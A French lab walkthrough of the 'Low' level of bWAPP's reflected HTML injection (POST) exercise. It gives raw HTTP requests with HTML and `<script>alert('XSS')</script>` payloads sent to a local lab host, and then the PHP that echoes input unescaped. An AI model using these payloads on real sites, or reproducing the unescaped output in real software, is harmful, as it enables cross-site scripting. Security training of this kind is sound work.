# Niveau "Low"

## Exploitation

L'exploitation est ici triviale. Le prénom et le nom sont renseignés dans un formulaire transféré par la méthode HTTP `POST` :&#x20;

![](<../../../../../.gitbook/assets/image (17) (1).png>)

Dont voici la requête :&#x20;

```http
POST /bWAPP/htmli_post.php HTTP/1.1
Host: 192.168.56.116
Content-Length: 46
Origin: http://192.168.56.116
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.56.116/bWAPP/htmli_post.php
Cookie: security_level=0; PHPSESSID=ca654b413e48f90c2da7d8bf914be955
Connection: close

firstname=pr%C3%A9nom&lastname=nom&form=submit
```

L'affichage des paramètres d'URL se faire directement au sein de la balise `<div></div>` contenant également le formulaire :&#x20;

```html
<div id="main">
  <h1>HTML Injection - Reflected (POST)</h1>
  <p>Enter your first and last name:</p>
  <form action="/bWAPP/htmli_post.php" method="POST">
    <p><label for="firstname">First name:</label><br />
    <input type="text" id="firstname" name="firstname"></p>
    <p><label for="lastname">Last name:</label><br />
    <input type="text" id="lastname" name="lastname"></p>
    <button type="submit" name="form" value="submit">Go</button>  
  </form>
  <br />
  Welcome prénom nom
</div>
```

Une première tentative d'injection peut se faire en se limitant à du code HTML, bien qu'il soit également possible d'injecter du Javascript :&#x20;

```http
POST /bWAPP/htmli_post.php HTTP/1.1
Host: 192.168.56.116
Content-Length: 128
Origin: http://192.168.56.116
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.56.116/bWAPP/htmli_post.php
Cookie: security_level=0; PHPSESSID=ca654b413e48f90c2da7d8bf914be955
Connection: close

firstname=%3Ch1%3ETitre+H1+contenant+le+pr%C3%A9nom%3C%2Fh1%3E&lastname=%3Ch1%3ETitre+H1+contenant+le+nom%3C%2Fh1%3E&form=submit
```

![](<../../../../../.gitbook/assets/image (19) (1).png>)

Mais l'injection Javascript est également tout à fait possible, ici avec `<script>alert('XSS')</script>` :&#x20;

```http
POST /bWAPP/htmli_post.php HTTP/1.1
Host: 192.168.56.116
Content-Length: 82
Origin: http://192.168.56.116
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.56.116/bWAPP/htmli_post.php
Cookie: security_level=0; PHPSESSID=ca654b413e48f90c2da7d8bf914be955
Connection: close

firstname=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&lastname=nom&form=submit
```

![](<../../../../../.gitbook/assets/image (9) (1) (1).png>)

## Analyse du code source

Après avoir testé que les paramètres sont bien présents, l'affichage s'effectue grâce à un simple `echo` :

{% code title="htmli_post.php" %}
```php
if(isset($_POST["firstname"]) && isset($_POST["lastname"])) {
  $firstname = $_POST["firstname"];
  $lastname = $_POST["lastname"];

  if($firstname == "" or $lastname == "") {
    echo "<font color=\"red\">Please enter both fields...</font>";
  }
  else {
    echo "Welcome " . htmli($firstname) . " " .  htmli($lastname);
  }
}
```
{% endcode %}

Les données sont au préalable traitées par la méthode `htmli()` permettant de gérer la difficulté du niveau sélectionné :

{% code title="htmli_post.php" %}
```php
function htmli($data) {
  switch($_COOKIE["security_level"]) {
    case "0" :
      $data = no_check($data);
      break;
    case "1" :
      $data = xss_check_1($data);
      break;
    case "2" :
      $data = xss_check_3($data);
      break;
    default :
      $data = no_check($data);
      break;;
  }

  return $data;
}
```
{% endcode %}

Le level "Low" correspond à la valeur 0, c'est à dire ici à l'exécution de la méthode `no_check()` qui retourne simplement la donnée :&#x20;

{% code title="functions_external.php" %}
```php
function no_check($data) {
  return $data
}
```
{% endcode %}
